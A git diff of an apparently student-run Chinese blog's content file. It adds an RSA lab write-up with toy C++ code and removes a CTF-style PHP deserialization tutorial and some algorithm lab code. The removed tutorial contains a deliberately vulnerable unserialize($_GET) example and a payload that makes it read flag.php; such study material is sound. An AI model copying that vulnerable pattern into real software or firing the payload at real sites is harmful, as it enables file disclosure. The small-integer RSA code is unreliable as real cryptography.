+    for(i = 1; i &lt;= e; i++)
+        C = C * M % n;
+    cout &lt;&lt;endl&lt;&lt; "-------------------- 加解密完成 ----------------------" &lt;&lt; endl&lt;&lt;endl;
+    cout &lt;&lt; "明文M= " &lt;&lt; M &lt;&lt; "  经加密后得到密文C=M^e(mod n):  " &lt;&lt; C &lt;&lt; endl;
+
+    //利用生成的私钥私钥{e,n}对密文C进行解密
+    M = 1;
+    for(i = 1; i &lt;= d; i++)
+        M = M * C % n;
+    cout &lt;&lt; "密文C= " &lt;&lt; C &lt;&lt; "  经解密后得到明文M=C^d(mod n):  " &lt;&lt; M &lt;&lt; endl;
+    return 0;
+}
+
 </code></pre>
-<h6 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h6><pre><code class="line-numbers language-php">&lt;?php
-class xctf{
-    public $flag = '111';
-    function __construct() {
-        echo ("Ab4ndon!");
+<h4 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h4><blockquote>
+<p>由于第四次实验是在考试周的时候做的，对于RSA的原理也不是很清楚，上面的代码也是借鉴了网上的，自己实验时发现样例能正常运行，但是有的例子没办法正常解码，最近有空又重新研究了一下RSA，记录如下。</p>
+</blockquote>
+<p><strong>原理</strong></p>
+<p>1.公钥与私钥的生成</p>
+<p>（1）选取两个大素数：p和q,(p≠q)；<br>（2）计算n=p*q；<br>（3）利用欧拉(Euler)函数的性质与定理计算Φ(n)=(p-1)·(q-1)</p>
+<blockquote>
+<p><strong>欧拉函数</strong>  设n是自然数，数列1，2，···，n-1中与n互素的数的个数称为n的欧拉函数，记为Φ(n)</p>
+<ul>
+<li>性质    若p是素数，则Φ(p)=(p-1)</li>
+<li>定理     设p和q是素数，对n=pq，有Φ(n)=Φ(p)Φ(q)=p-1)·(q-1)</li>
+</ul>
+</blockquote>
+<p>（4）随机选择加密密钥e(公钥)，使 gcd(Φ(n),e)=1; 1&lt;e&lt;Φ(n)<br>（5）最后，利用Euclid（欧几里得）算法计算解密密钥d，使其满足ed=1（mod Φ(n)）。</p>
+<blockquote>
+<p>后来自己重新敲代码的时候对这一步产生了误解，因为书上给的公式是d=e^(-1)modΦ(n),我把e^(-1)理解成-1次幂了。后来重新看书和查资料，这里描述的应该是e和d是互逆的关系，e^(-1)指的是e是d关于模Φ(n)的乘法逆元</p>
+<p><strong>乘法逆元</strong>    设a是整数，若存在x使得ax≡1(mod n),则称a与x互逆，x是a关于模n的乘法逆元(inverse),记为x=a^(-1)</p>
+</blockquote>
+<p>​    然后将（e，n）公开，即为公钥PK，私人保存好d，即为私钥SK。</p>
+<p>2.加密与解密</p>
+<p>加密公式为<br>$$<br>C=M^e  mod n<br>$$<br>解密公式为<br>$$<br>M^`=C^d  mod n<br>$$<br>一般在计算M^e modn的时候都是计算M mod n然后累乘 e次，这是按模计算原理的推论。</p>
+<h4 id="重新敲的代码"><a href="#重新敲的代码" class="headerlink" title="重新敲的代码"></a>重新敲的代码</h4><blockquote>
+<p>针对之前代码中出现的部分样例解密失败的问题，我认为与未对输入的素数和公钥e与Φ(n)是否互质进行检验有很大关系，于是在新的代码中加入了 JudgePrime 和 IsCoprime 分别进行判断，经过测试，成功解决了之前的解密失败问题（但是对于密文长度较长的情况还是会失败，目前未找到原因）:sob:</p>
+</blockquote>
+<pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
+using namespace std;
+int MOD;
+int JudgePrime(int x)
+{
+    if(x == 1) return 1;
+    for(int i=2;i &lt;=x/2;i++)
+    {
+        if(x % i == 0)
+            return 0;  
+    }
+    return 1;
+}
+
+
+bool isCoprime(int x,int y)
+{
+    if(x==1 &amp;&amp; y==1)//1和1互质
+        return true;
+    else if(x&lt;=0 || y&lt;=0 || x==y)//非正整数都不存在互质的说法
+        return false;
+    else if(x==1 || y==1)//1和任何正整数都互质
+        return true;
+    else
+    {
+        int tmp=0;
+        //使用求商判断法，如果输入的x&lt;y，第一次循环会交换x和y的位置
+        while(true)
+        {
+            tmp=x%y;
+            if(tmp==0)
+            {
+                break;
+            }
+            else
+            {
+                x=y;
+                y=tmp;
+            }
+        }
+        if(y==1)          //最大公约数为1,所以互质
+            return true;
+        else              //最大公约数大于1，所以不互质
+            return false;
+ 
     }
 }
-    
-    $a = new xctf();
-    
-?&gt;
-</code></pre>
-<p>运行结果：<strong>Ab4ndon!</strong></p>
-<p>可以很清楚地看出来construct()魔术方法在创建对象时进行了调用</p>
-<h6 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h6><pre><code class="line-numbers language-php">&lt;?php
-class Example {
-    var $var = '';
-    function __destruct() {
-        highlight_file($this-&gt;var);  //常用文件读取函数：readfile（需要去源码里看） highlight_file                                                                       show_source            file_get_contents（不会输出）
+
+//由公开密钥e和n，求私有密钥d
+int ext_euclid(int a, int b, int &amp;x, int &amp;y) 
+{ 
+    if(b == 0)
+    {
+        x = 1;
+        y = 0;
+        return a;
     }
+    int gcd = ext_euclid(b, a % b, x, y);
+    int t = x % MOD;
+    x = y % MOD;
+    y = ((t - a / b * x) % MOD + MOD) % MOD;
+    return gcd;
 }
-unserialize($_GET['a']);
-/*$obj = new Example();            //实例化一个对象，并将其序列化：O:7:"Example":1:{s:3:"var";s:8:"flag.php";}
-$obj-&gt;var='flag.php';
-var_dump(serialize($obj));
-*/
-?&gt;　
-    
-    
-  //flag.php
-    &lt;?php
-$flag="flag!!!!!";
-</code></pre>
-<p>payload如下：<code>?a=O:7:"Example":1:{s:3:"var";s:8:"flag.php";}</code></p>
-<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/image-20201011115348580.png" alt="image-20201011115348580" style="zoom:67%;">
 
-<h6 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h6><h5 id="5-session反序列化"><a href="#5-session反序列化" class="headerlink" title="5.session反序列化"></a>5.session反序列化</h5><p>在php.ini中存在三项配置项：</p>
-<ul>
-<li><code>session.save_path=""</code> –设置session的存储路径</li>
-<li><code>session.save_handler=""</code> –<strong>设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</strong></li>
-<li><code>session.auto_start boolen</code> –指定会话模块是否在请求开始时启动一个会话，默认为0不启动</li>
-<li><code>session.serialize_handler string</code> –<strong>定义用来序列化/反序列化的处理器名字。默认使用php (php&lt;5.5.4)</strong></li>
-</ul>
-<p><strong>在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</strong></p>
-<table>
-<thead>
-<tr>
-<th>引擎</th>
-<th>session存储方式</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>php(php&lt;5.5.4)</td>
-<td>存储方式是，键名+竖线`</td>
-</tr>
-<tr>
-<td>php_serialize(php&gt;5.5.4)</td>
-<td>存储方式是，经过serialize()函数序列化处理的键和值（将session中的key和value都会进行序列化）</td>
-</tr>
-<tr>
-<td>php_binary</td>
-<td>存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</td>
-</tr>
-</tbody></table>
-<p>在PHP (php&lt;5.5.4) 中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码<code>ini_set('session.serialize_handler', '需要设置的引擎名');</code>进行设置。</p>
-<p>示例代码如下：</p>
-<pre><code class="line-numbers language-php">&lt;?php
-ini_set('session.serialize_handler', 'php_serialize');   //设置序列化引擎使用php_serialize
-session_start();
-// do something
-......
-</code></pre>
-<p><strong>由于序列化和反序列化所使用的序列化引擎不一样就是造成PHP Session序列化漏洞的原因</strong></p>
-<p>（此处使用的是php7.3.4nts）</p>
-<ul>
-<li>php引擎</li>
-</ul>
-<pre><code class="line-numbers language-php">&lt;?php
-ini_set('session.serialize_handler', 'php');
-session_start();      // session_start()会创建新会话或者重用现有会话
-$_SESSION['name'] = 'Ab4ndon';
-var_dump();
-?&gt;
-</code></pre>
-<p>去本地文件夹下找到存储session文件的地方，如我的：D:\phpstudy_pro\Extensions\tmp\tmp，发现一个sess开头的文件，sess_后面是PHPSESSID的值</p>
-<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/image-20201011105453092.png" alt="image-20201011105453092" style="zoom:50%;">
 
-<p>打开，内容为：<strong>name|s:7:”Ab4ndon”;</strong>     <strong>键名+竖线<code>|</code>+经过serialize()函数序列处理的值（只序列化值</strong>）</p>
-<ul>
-<li>php_serialize引擎</li>
-</ul>
-<pre><code class="line-numbers language-php">&lt;?php
-ini_set('session.serialize_handler', 'php_serialize');
-session_start();      // session_start()会创建新会话或者重用现有会话
-$_SESSION['name'] = 'Ab4ndon';
-var_dump();
-?&gt;
-</code></pre>
-<p>文件内容：<strong>a:1:{s:4:”name”;s:7:”Ab4ndon”;}</strong>    <strong>a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key(键)和value(值)都会进行序列化</strong>。</p>
-<ul>
-<li>php_binary</li>
-</ul>
-<pre><code class="line-numbers language-php">&lt;?php
-ini_set('session.serialize_handler', 'php_binary');
-session_start();      // session_start()会创建新会话或者重用现有会话
-$_SESSION['name'] = 'Ab4ndon';
-var_dump();
-?&gt;
-</code></pre>
-<p>文件内容：<strong>names:7:”Ab4ndon”;</strong>      键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值.由于name的长度是4，4在ASCII表中对应的就是。根据php_binary的存储规则，最后就是<code>names:7:"Ab4ndon";</code> </p>
-<h5 id="6-字符串逃逸"><a href="#6-字符串逃逸" class="headerlink" title="6.字符串逃逸"></a>6.字符串逃逸</h5><img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/YqFpH1.png" alt="1" style="zoom:67%;">
+int main()
+{
+    int p,q,n,e,d;
+    cout&lt;&lt;"请输入第一个大素数p："&lt;&lt;endl;
+    cin&gt;&gt;p;
+    while(!JudgePrime(p))
+        {
+            cout&lt;&lt;"【 抱歉，您输入的不是素数，请重新输入！】"&lt;&lt;endl;
+             cin&gt;&gt;p;
+        }
+        
+    cout&lt;&lt;"请输入第二个大素数q："&lt;&lt;endl;
+    cin&gt;&gt;q;
+    while(!JudgePrime(q))
+        {
+            cout&lt;&lt;"【 抱歉，您输入的不是素数，请重新输入！】"&lt;&lt;endl;
+             cin&gt;&gt;q;
+        }
+    n=p*q;
+    cout&lt;&lt;"\n乘积 n=p*q= "&lt;&lt;n&lt;&lt;endl;
+    MOD=(p-1)*(q-1);
+    cout&lt;&lt;"φ(n)=(p-1)(q-1)= "&lt;&lt;MOD&lt;&lt;endl;
+    cout&lt;&lt;"\n请输入一个与φ(n)互质的公钥e: "&lt;&lt;endl;
+    cin&gt;&gt;e;
+    while(!isCoprime(e,MOD))
+    {
+        cout&lt;&lt;"【 e与φ(n)不互质，请重新输入！】"&lt;&lt;endl;
+        cin&gt;&gt;e;
+    }
+    //由e和φ(n)生成私钥d
+    int x, y;
+    ext_euclid(e, MOD, d, y);
+    while(d &lt; 0) 
+        d += MOD;
+    cout &lt;&lt; "\n通过调用扩展欧几里德算法，求得密钥d为：" &lt;&lt; d &lt;&lt; endl;
 
-<p>首先我们需要知道，在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。而且最后变量闭合都需要双引号以及结束的花括号，举个例子：</p>
-<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></p>
-<p>和</p>
-<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}xxx</code>(xxx是任意的一串字符)</p>
-<p>反序列化后的结果是一样的，也就是说，php在反序列化的时候是严格地按照一定的格式去进行的。</p>
-<p>如果指定的长度错误则反序列化就会失败。</p>
-<p>测试如下：</p>
-<pre><code class="line-numbers language-php">&lt;?php
-class xctf{
-    public $flag = '111';
+    //利用生成的公钥{e,n}对明文M进行加密
+    int M, C;
+    cout &lt;&lt; "现在公钥{e,n}、私钥{d,n}均已生成完毕。\n\n请输入需要传输的明文内容进行加密:";
+    cin &gt;&gt; M;
+    cout &lt;&lt;endl&lt;&lt; "-------------------- 加解密完成 ----------------------" &lt;&lt; endl&lt;&lt;endl;
+    C = 1;
+    for(int i = 1; i &lt;= e; i++)
+        C = C * M % n;
+    cout &lt;&lt; "明文M= " &lt;&lt; M &lt;&lt; "  经加密后得到密文C=M^e(mod n):  " &lt;&lt; C &lt;&lt; endl;
+
+    //利用生成的私钥私钥{e,n}对密文C进行解密
+    M = 1;
+    for(int i = 1; i &lt;= d; i++)
+        M = M * C % n;
+    cout &lt;&lt; "密文C= " &lt;&lt; C &lt;&lt; "  经解密后得到明文M=C^d(mod n):  " &lt;&lt; M &lt;&lt; endl;
+    return 0;
+
+
 }
-    
-    $a = new xctf();
-    $a_ser = serialize($a);   //O:4:"xctf":1:{s:4:"flag";s:3:"111";}
-
-//print_r($a_ser);
-$res=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"111";}');
-$res2=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"111";}xxx');
-$res3=unserialize('O:4:"xctf":1:{s:4:"flag";s:3:"11";}');
-print_r($res);
-print_r($res2);
-print_r($res3);
-
-?&gt;
 </code></pre>
-<pre><code>//输出结果
-xctf Object          //$res
-(
-    [flag] =&gt; 111
-)
-xctf Object            //$res2
-(
-    [flag] =&gt; 111
-)
-</code></pre>
-<p>如果我们将111改为11，就会反序列化失败，我的vscode没有任何输出。</p>
-<p>为什么呢？因为此时的flag所读取的数据为11“而<strong>正常的语法是需要用”;去闭合当前的变量，而因为长度错误所以此时php把闭合的双引号当做了字符串，所以下一个字符就成了分号，没能闭合导致抛出了错误。</strong></p>
-<p><a href="https://www.cnblogs.com/Sumarua/p/12932401.html"></a><a href="https://www.cnblogs.com/Sumarua/p/12932401.html">PHP反序列化字符逃逸详解</a></p>
-<p><a href="https://www.cnblogs.com/hello-there/p/12870541.html">浅谈PHP字符串逃逸</a></p>
-<p>知识补充<br>unserialize漏洞依赖几个条件：</p>
-<p>unserialize函数的参数可控<br>脚本中存在一个构造函数（__construct()）、析构函数（__destruct()）、__wakeup()函数中有向php文件中写数据的操作的类<br>所写的内容需要有对象中的成员变量的值<br>防范的方法有：</p>
-<ol start="4">
-<li>严格控制unserialize函数的参数，坚持用户所输入的信息都是不可靠的原则</li>
-<li>对于unserialize后的变量内容进行检查，以确定内容没有被污染</li>
-</ol>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -2552,11 +3701,11 @@ xctf Object            //$res2
           });
       </script>]]></content>
       <categories>
-        <category>CTF</category>
+        <category>算法设计与分析</category>
       </categories>
       <tags>
-        <tag>Web</tag>
-        <tag>PHP反序列化</tag>
+        <tag>C++</tag>
+        <tag>算法设计与分析</tag>
       </tags>
   </entry>
   <entry>
@@ -4873,1155 +6022,6 @@ int main()
       <tags>
         <tag>生活</tag>
         <tag>诗词</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【NJUPT】 算法实验（合集）</title>
-    <url>/2021/07/06/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C%E5%90%88%E9%9B%86/</url>
-    <content><![CDATA[<h2 id="实验一："><a href="#实验一：" class="headerlink" title="实验一："></a>实验一：</h2><p>1用分治法实现一组无序序列的两路合并排序和快速排序。 要求清楚合并排序及快速排 序的基本原理， 编程实现分别用这两种方法将输入的一组无序序列排序为有序序列后输出。 </p>
-<p>2采用基于“五元中值组取中值分割法”（median-of-median-of-five partitioning） 的线性<br> 时间选择算法，找出 N 个元素集合 S 中的第 k 个最小的元素，使其在线性时间内解决。（参<br> 考教材 5.5.3 节）</p>
-<p>​        <strong>分治法</strong>采用将一个难以直接求解的复杂问题分解成若干个规模较小、相互独立，但类型相同的子问题，直到子问题足够小，能够直接求解为止，然后求解这些子问题，并且将子问题的解合成原始问题的一个完整解的策略。基于这样一种策略，我们可以用它来解决一系列复杂的问题。对于排序问题，将原来的序列分成一个个子序列后分别进行排序，再将已排序的子序列合成一个有序序列是可行的，所以符合分治法策略。不过，合并排序和快速排序虽然都运用分治策略，但两者的角度不同，得到的排序算法也不相同。合并排序的问题分解过程十分简单，只需将序列一分为二即可：而快速排序的问题分解方法相对较困难，需调用Partition函数将一个序列划分为子序列。然而，从子问题解得到原问题解的过程对于快速排序来说异常简单，几乎无须额外的工作；但对于合并排序，则需要调用Merge函数来实现。所以，其实Partition函数和Merge函数是这两种排序算法的核心。而线性时间选择第k小元素这个算法我觉得也是受到了快速排序中的分划方法的启迪，采用分治法策略去求。</p>
-<h3 id="1-合并排序与快速排序"><a href="#1-合并排序与快速排序" class="headerlink" title="1.合并排序与快速排序"></a>1.合并排序与快速排序</h3><pre><code class="line-numbers language-c++">#include&lt;iostream&gt;
-#include&lt;fstream&gt;
-#define INFTY 2147483647;
-using namespace std;
-
-class SortableList
-{
-    public:
-        SortableList(int mSize)
-        {
-            maxSize = mSize;
-            l = new int[maxSize];
-            n = 0;
-        }
-        ~SortableList()
-    {
-    delete[] l;
-    }
-        void Input();
-        void Output();
-        void MergeSort();
-        void QuickSort();
-    private:
-        int *l;
-        int maxSize;
-        int n;
-        void Merge(int left,int mid,int right);
-        void MergeSort(int left,int right);
-        void QuickSort(int left, int right);
-        void Swap(int i,int j);
-        int Partition(int left, int right);
-        
-        
-};
-
-void SortableList::Merge(int left,int mid,int right)
-{
-    int *temp = new int[right - left + 1];
-    int i = left, j = mid + 1, k = 0;
-    while((i&lt;=mid)&amp;&amp;(j&lt;=right))
-        if(l[i]&lt;=l[j])
-            temp[k++] = l[i++];
-        else
-            temp[k++] = l[j++];
-    while(i&lt;=mid)                //将剩余元素输出
-        temp[k++] = l[i++];
-    while(j&lt;=right)
-        temp[k++] = l[j++];
-    for (i = 0, k = left; k &lt;= right;)  //将排好序的有序序列复制到原序列中去
-        l[k++] = temp[i++];
-}
-
-void SortableList::MergeSort()
-{
-    MergeSort(0,n-1);
-}
-void SortableList::MergeSort(int left,int right)
-{
-    if(left&lt;right)
-    {
-        int mid = left + (right-left) / 2;
-        MergeSort(left,mid);
-        MergeSort(mid+1,right);
-        Merge(left,mid,right);
-    }
-}
-
-void SortableList::Swap(int i,int j)
-{
-    int temp = l[i];
-    l[i] = l[j];
-    l[j] = temp;
-}
-
-int SortableList::Partition(int left,int right)
-{
-    int i = left, j = right + 1;
-    l[n]=INFTY;
-    do{
-        do
-            i++;
-        while (l[i]&lt;l[left]);
-        do
-            j--;
-        while (l[j]&gt;l[left]);
-        if(i&lt;j)
-            Swap(i,j);
-    } while (i &lt; j);
-    Swap(left,j);
-    return j;
-}
-
-void SortableList::QuickSort()
-{
-    QuickSort(0,n-1);
-}
-void SortableList::QuickSort(int left,int right)
-{
-    if(left&lt;right)
-    {
-        int j = Partition(left,right);
-        QuickSort(left,j-1);
-        QuickSort(j+1,right);
-    }
-}
-
-// void SortableList::Input()
-// {
-//     for (int i = 0; i &lt; maxSize;i++)
-//     {
-//         cin &gt;&gt; l[i];
-//         n++;
-//     }
-// }
-
-void SortableList::Input()
-{
-    int i = 0;
-    ifstream out ("Sort.txt");
-    if(!out)
-    {
-        cout &lt;&lt; "Can not open output file.\n";
-        return;
-    }
-    for (i = 0; i &lt; maxSize;i++)
-    {
-        out &gt;&gt; l[i];
-        n++;
-    }
-    out.close();
-   
-}
-
-void SortableList::Output()
-{
-    for (int i = 0; i &lt; maxSize;i++)
-    {
-        cout &lt;&lt; l[i] &lt;&lt; " ";
-       // cout &lt;&lt; endl;
-    }
-}
-
-int main()
-{
-    int key;
-    int x, k;
-    SortableList list(30);
-    cout &lt;&lt; "原始序列：\n" &lt;&lt; endl;
-    list.Input();
-    list.Output();
-    cout &lt;&lt; "\n\n请选择排序算法：【0】两路合并排序  【1】快速排序\n" &lt;&lt; endl;
-    cin &gt;&gt; key;
-    
-    if(key==0)
-    {
-        list.MergeSort();
-    }
-    else
-        list.QuickSort();
-    cout &lt;&lt; "排序后的序列：\n\n";
-    list.Output();
-   
-}
-</code></pre>
-<h3 id="2-选择第k小元素"><a href="#2-选择第k小元素" class="headerlink" title="2.选择第k小元素"></a>2.选择第k小元素</h3><p>​       求第k小元素其实可以直接通过排序算法将原序列排序好，然后取出第k小元素即可，但是这样的话在最坏情况下的时间复杂度就不是线性的了，比如采用快速排序，那么在最坏情况下时间复杂度为O(n^2)。人们并不满足与这样的时间复杂度，所以继续去优化这样的一个算法，采用二次取中法确定主元的方式使得分划所得的两个子集合的大小相对接近，从而避免了上述最坏情况的发生，使得最坏情况下的时间复杂度也是O(n),我想这就是算法设计与分析的魅力所在，通过应用或设计一种算法去不断优化时空复杂度。</p>
-<pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
-#include &lt;fstream&gt;
-#define INFTY 2147483647;
-using namespace std;
-
-class SortableList
-{
-    public:
-        SortableList(int mSize)
-        {
-            maxSize = mSize;
-            l = new int[maxSize];
-            n = 0;
-        }
-        ~SortableList()
-    {
-    delete[] l;
-    }
-        void Input();
-        void Output();
-        void MergeSort();
-        int Select(int&amp; x,int k);
-        int Ceil(int a,int b);
-
-    private:
-        int *l;
-        int maxSize;
-        int n;
-        void Merge(int left,int mid,int right);
-        void MergeSort(int left,int right);
-        void Swap(int i,int j);
-        int Partition(int left, int right);
-        int Select(int k,int left,int right,int r);
-        
-};
-
-void SortableList::Merge(int left,int mid,int right)
-{
-    int *temp = new int[right - left + 1];
-    int i = left, j = mid + 1, k = 0;
-    while((i&lt;=mid)&amp;&amp;(j&lt;=right))
-        if(l[i]&lt;=l[j])
-            temp[k++] = l[i++];
-        else
-            temp[k++] = l[j++];
-    while(i&lt;=mid)                //将剩余元素输出
-        temp[k++] = l[i++];
-    while(j&lt;=right)
-        temp[k++] = l[j++];
-    for (i = 0, k = left; k &lt;= right;)  //将排好序的有序序列复制到原序列中去
-        l[k++] = temp[i++];
-}
-
-void SortableList::MergeSort()
-{
-    MergeSort(0,n-1);
-}
-void SortableList::MergeSort(int left,int right)
-{
-    if(left&lt;right)
-    {
-        int mid = left + (right-left) / 2;
-        MergeSort(left,mid);
-        MergeSort(mid+1,right);
-        Merge(left,mid,right);
-    }
-}
-
-void SortableList::Swap(int i,int j)
-{
-    int temp = l[i];
-    l[i] = l[j];
-    l[j] = temp;
-}
-
-int SortableList::Partition(int left,int right)
-{
-    int i = left, j = right + 1;
-    l[n]=INFTY;
-    do{
-        do
-            i++;
-        while (l[i]&lt;l[left]);
-        do
-            j--;
-        while (l[j]&gt;l[left]);
-        if(i&lt;j)
-            Swap(i,j);
-    } while (i &lt; j);
-    Swap(left,j);
-    return j;
-}
-
-
-void SortableList::Input()
-{
-    int i = 0;
-    ifstream out ("Sort.txt");
-    if(!out)
-    {
-        cout &lt;&lt; "Can not open output file.\n";
-        return;
-    }
-    for (i = 0; i &lt; maxSize;i++)
-    {
-        out &gt;&gt; l[i];
-        n++;
-    }
-    out.close();
-   
-}
-
-void SortableList::Output()
-{
-    for (int i = 0; i &lt; maxSize;i++)
-    {
-        cout &lt;&lt; l[i] &lt;&lt; " ";
-       // cout &lt;&lt; endl;
-    }
-}
-
-int SortableList::Ceil(int a,int b)
-{
-    return (int)(a / b) + 1;
-}
-
-int SortableList::Select(int&amp;x,int k)
-{
-    if(n&lt;=0||k&gt;n||k&lt;=0)
-        return -1;
-    int j = Select(k,0,n-1,5);
-    x = l[j];
-        return 1;
-}
-
-int SortableList::Select(int k,int left,int right,int r)
-{
-    int n = right - left + 1;
-    if(n&lt;=r)
-    {
-        MergeSort(left,right);
-        return left + k - 1;
-    }
-    for (int i = 1; i &lt; n / r;i++)
-    {
-        MergeSort(left+(i-1)*r,left+i*r-1);
-        Swap(left+i-1,left+(i-1)*r+Ceil(r,2)-1);
-
-    }
-    int j = Select(Ceil(n/r,2),left,left+(n/2)-1,r);
-    Swap(left,j);
-    j = Partition(left,right);
-    if(k==j-left+1)
-        return j;
-    else if(k&lt;j-left+1)
-        return Select(k,left,j-1,r);
-        else
-            return Select(k-(j-left+1),j+1,right,r);
-
-}
-
-int main()
-{
-    int key;
-    int x, k;
-    SortableList list(30);
-    list.Input();
-    list.Output();
-    cout &lt;&lt; "\n\n请输入要寻找的第几小元素：\n";
-    cin &gt;&gt; k;
-    list.Select(x,k);
-    cout &lt;&lt; x &lt;&lt; endl;
-    //list.Output();
-}
-</code></pre>
-<h2 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h2><ul>
-<li>用动态规划法和备忘录方法实现求两序列的 最长公共子序列问题。 要求掌握动态规划法思想在实际中的应用，分析最长公共子序列的问题特征，选择算法策略并设计具体算法，编程实现两输入序列的比较，并输出它们的最长公共子序列。</li>
-<li>用动态规划法和备忘录方法求解矩阵相乘问题， 求得最优的计算次序以使得矩阵连乘总的数乘次数最少，并输出加括号的最优乘法算式。</li>
-</ul>
-<h3 id="1-最长公共子序列"><a href="#1-最长公共子序列" class="headerlink" title="1.最长公共子序列"></a>1.最长公共子序列</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
-using namespace std;
-int const MaxLen = 50;
-class LCS
-{
-    public:
-        LCS(int nx,int ny,char *a,char *b);
-        ~LCS();
-        int LCSLength();
-        void CLCS();
-        void Output(int **a);
-        int** getc()  // 用来访问私有数据成员
-        {
-            return c;
-        };
-         int** gets()
-        {
-            return s;
-        };
-
-    private:
-        void CLCS(int i,int j);
-        int **c, **s;
-        int m, n;
-        char *x, *y;
-};
-
-LCS::LCS(int nx,int ny,char *a,char *b)
-{
-    m = nx;
-    n = ny;
-    x = a;
-    y = b;
-    c = new int *[m + 1];
-    s = new int *[m + 1];
-    for (int i = 0; i &lt;= m;i++)
-    {
-        c[i] = new int[n + 1];
-        s[i] = new int[n + 1];
-    }
-}
-
-LCS::~LCS()
-{
-    for (int i = 0; i &lt; m;i++)
-    {
-        delete c[i];
-        delete s[i];
-    }
-    delete c;
-    delete s;
-}
-
-int LCS::LCSLength()
-{
-    int i,j;
-    for ( i = 0; i &lt;= m;i++)
-        {
-            c[i][0] = 0;
-            s[i][0] = 0;
-        }
-    for (j = 1; j &lt;= n;j++)
-        {
-            c[0][j] = 0;
-            s[0][j] = 0;
-        }
-    for (i = 1; i &lt;= m;i++)
-        {
-            for (j = 1; j &lt;= n;j++)
-            {
-                // if(x[i]==y[i])   !!!!! 应该是y[j]
-                // {
-                //     c[i][j] = c[i-1][j-1]+ 1;   // 左上格值 + 1
-                //     s[i][j] = 1;
-                // }
-                if(x[i] == y[j])  //由c[i-1][j-1]得到c[i][j]
-                {
-                    c[i][j] = c[i - 1][j - 1] + 1;
-                    s[i][j] = 1;
-                }
-                else if(c[i-1][j] &gt;= c[i][j-1])    // 左格值 &gt; 上格值
-                {
-                    c[i][j] = c[i - 1][j];
-                    s[i][j] = 2;
-                }
-                else     //左格值 &lt; 上格值
-                {
-                    c[i][j] = c[i][j - 1];
-                    s[i][j] = 3;
-                }
-            }
-        }    
-return c[m][n];      // 返回最优解值
-}
-
-void LCS::CLCS(int i,int j)
-{
-    if(i==0||j==0)
-        return;
-    if(s[i][j]==1)
-    {
-        CLCS(i-1,j-1);
-        cout &lt;&lt; x[i];
-    }else if(s[i][j]==2)
-        CLCS(i-1,j);
-    else
-        CLCS(i, j - 1);
-}
-void LCS::CLCS()
-{
-    CLCS(m,n);
-}
-
-void LCS::Output(int **a)
-{
-    
-    int i, j;
-    printf("  ");
-    for (i = 0; i &lt;= n;i++)
-    {
-        printf("%4d",i);
-    }
-    printf("\n");
-    for (i = 0; i &lt;= m;i++)
-    {
-        printf("%2d",i);
-        for (j = 0; j &lt;= n;j++)
-           {
-               printf("%4d",a[i][j]);
-           }
-           printf("\n");
-    }
-   
-}
-
-int main()
-{
-    // int nx = 7, ny = 6;
-    // char *x = (char*)"0abcbdab";
-    // char *y = (char*)"0bdcaba";
-    
-    int nx, ny;
-    char *x = new char[MaxLen], *y = new char[MaxLen];
-    cout &lt;&lt; "Please input X:(Start with 0, like 0ab)" &lt;&lt; endl;
-    scanf("%s", x);
-    nx = strlen(x)-1;
-    cout &lt;&lt;endl&lt;&lt; "Please input Y:(Start with 0, like 0ab)" &lt;&lt; endl;
-    scanf("%s", y);
-    ny = strlen(y)-1;
-    LCS lcs(nx, ny, x, y);
-    cout &lt;&lt;endl&lt;&lt; "The LCSLength of X and Y is: " &lt;&lt; lcs.LCSLength() &lt;&lt; endl&lt;&lt;endl;
-    cout &lt;&lt; "The CLCS is: " ;
-    lcs.CLCS();
-    cout &lt;&lt; endl;
-    
-    cout &lt;&lt;endl&lt;&lt; "  c  =  " &lt;&lt; endl&lt;&lt;endl;
-    lcs.Output(lcs.getc());    // 输出c[i][j]
-    cout &lt;&lt;endl&lt;&lt;endl&lt;&lt; "  s  =  " &lt;&lt; endl&lt;&lt;endl;
-    lcs.Output(lcs.gets());   // 输出s[i][j]
-    delete []x;
-    delete []y;
-    return 0;
-}
-</code></pre>
-<h3 id="2-矩阵连乘"><a href="#2-矩阵连乘" class="headerlink" title="2.矩阵连乘"></a>2.矩阵连乘</h3><pre><code class="line-numbers language-C++">#include &lt;iostream&gt;
-#include &lt;iomanip&gt;  //输出格式头文件
-using namespace std;
-int const MaxLen = 50;
-class MatrixChain
-{
-    public:
-        MatrixChain(int mSize,int *q);
-        int MChain();
-        int LookupChain();
-        void Traceback();
-        void Output();
-
-    private:
-        void Traceback(int i,int j);
-        int LookupChain(int i,int j);
-        int *p, **m, **s, n;
-};
-
-MatrixChain::MatrixChain(int mSize, int *q)
-{  n=mSize;
-   m=new int*[n];   s=new int*[n];   p=new int[n+1];
